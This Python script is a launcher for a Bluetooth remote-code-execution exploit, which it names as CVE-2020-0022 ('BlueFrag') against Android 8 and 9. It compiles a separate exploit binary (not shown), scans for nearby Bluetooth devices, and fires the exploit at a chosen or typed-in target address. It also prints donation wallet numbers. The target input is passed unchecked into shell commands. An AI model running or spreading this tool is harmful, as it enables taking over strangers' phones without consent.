from os import system as sh
from time import sleep

def install():
    tr = sh('rm installed')
    tr = sh('ls | grep poc >> installed')
    f = open('installed')
    if f.readline() != "poc\n":
        print("Installing and compiling dependencies...")
        sleep(3)
        tr = sh('apt install gcc g++ build-essential bluetooth libbluetooth-dev bluez -y')
        tr = sh('gcc poc.c -lbluetooth -o poc')
        tr = sh('clear')
install()
lines = 0
sh('figlet "BlUe|FrAg"')
print("Author: https://vk.com/id377607431")
print()
print("Description: BlueTooth RCE Exploit based on vuln CVE-2020-0022 By CodeName 'BlueFrag'")
print("This Exploit support Android 8 and 9")
print()
print("Donate: Qiwi: 79881301595")
print("        WMR: R755498264558")
print("        WMZ: Z088857910482")
print()
print("==========MODES==========")
print("Target scan for exploit: (1)")
print("Exploit a specific target: (2)")
print("=========================")
print()
userinp = input("Choose the mode (default: 1): ")
def scanandexploit():
    tr = sh('clear')
    print("Scanning...")
    tr = sh('hciconfig hci0 up')
    tr = sh('hcitool scan >> targets')
    global lines
    for line in open('targets'):
        lines += 1
    for i in range(1, lines):
        tr = sh('cat targets | grep : | awk \'{print "Addr(%s): "$1; print "Device: "$2; print ""}\'' % i)

    devid = int(input("Input device ID: "))
    r = 0
    btaddr = ''
    f = open('targets')
    f.readline()
    for i in range(devid):
        line = f.readline()
    for i in line:
        if i == "\n" or i == "\t":
            continue
        r += 1
        if r > 17:
            break
        btaddr += i
    tr = sh('rm targets')
    print("Addres %s added to memory" % btaddr)
    print("Exploiting...")
    sleep(3)
    sh('./poc %s' % btaddr)
def attackspec():
    usinp = input("Input target BT Addres: ")
    print("Exploiting...")
    sleep(3)
    sh('./poc %s' % usinp)
if userinp == str(1):
    scanandexploit()
elif userinp == str(2):
    attackspec()
else:
    scanandexploit()

